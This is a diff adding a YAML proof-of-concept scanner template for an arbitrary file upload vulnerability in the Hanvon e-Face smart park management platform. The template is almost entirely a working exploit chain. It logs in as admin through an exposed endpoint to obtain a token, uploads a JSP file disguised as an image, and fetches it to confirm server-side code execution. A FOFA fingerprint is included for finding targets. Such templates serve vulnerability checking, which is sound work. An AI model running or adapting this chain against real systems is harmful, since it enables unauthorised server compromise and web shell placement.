@@ -1,0 +1,39 @@
+id: poc-yaml-hw-e-face-pass-spmp-mobimeetingapp-anyfile-upload
+info:
+  name: 汉王e脸通智慧园区管理平台 mobiMeetingApp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: e脸通智慧园区管理平台
+  fofa: icon_hash="1380907357"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+  expression: status_code == 200 && contains(body,"\"userName\":\"admin\"") && matches(body,"\"password\":\"([0-9a-z]+)\"")
+  output:
+  - regex_match(body,"\"token\":\"(?P<token>.*?)\",")
+- method: POST
+  path: /manage/mobiMeetingApp/uploadMeetingFile.do
+  headers:
+    token: '{{.token}}'
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,".jsp")
+  output:
+  - regex_match(body,"\"path\":\"(?P<file>[0-9a-z]+).jsp")
+- method: GET
+  path: /manage/resource/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
